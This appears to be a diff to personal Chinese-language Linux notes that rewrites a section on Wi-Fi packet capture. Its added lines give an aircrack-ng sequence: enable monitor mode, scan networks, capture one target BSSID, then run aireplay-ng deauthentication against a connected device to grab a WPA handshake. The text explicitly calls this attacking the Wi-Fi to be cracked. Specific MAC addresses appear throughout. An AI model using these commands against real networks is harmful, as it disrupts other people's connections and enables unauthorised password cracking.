@@ -312,17 +312,31 @@ lib文件位置：/usr/lib
 
 ### linux 抓包
 
-#scan wifi list
-airodump-ng wlan0mon
+aircrack+ac210网卡
 
-#capture wifi    
-airodump-ng --bssid F4:83:CD:B5:84:19 -c 1 -w /home/ wlan0mon 
+```shell
+#iwconfig
+记下wlan名字
 
-#open another terminal,break a link
+#开启监控模式
+airmon-ng start wlan0
 
-aireplay-ng -0 8 -c 66:9C:A1:A0:38:9F -a F4:83:CD:B5:84:19 wlan0mon
-aireplay-ng -0 8 -c 14:16:9E:3A:EA:C7 -a F4:83:CD:B5:84:19 wlan0mon
-aireplay-ng -0 8 -c 28:02:D8:06:FB:B6 -a F4:83:CD:B5:84:19 wlan0mon
+#扫描wifi列表
+airodump-ng wlan0mon，然后CTRL C 记录bssid
+
+#捕获wifi
+airodump-ng --bssid F4:83:CD:B5:84:19(待破解的wifi的ssid) -c 1(CH信道channel
+) -w（保存包的路径） /home/ wlan0mon
+    station 记录的就是当前连接的终端
+
+#打开另一个终端进行攻击
+aireplay-ng -0 8 -c 66:9C:A1:A0:38:9F（正在连这个wifi的设备的ssid） -a F4:83:
+CD:B5:84:19 wlan0mon
+
+#当终端出现
+ WPA handshake: C8:F8:6D:2F:F6:7D
+就成功抓包了
+```
 
 #pin 
 airodump-ng wlan0mon
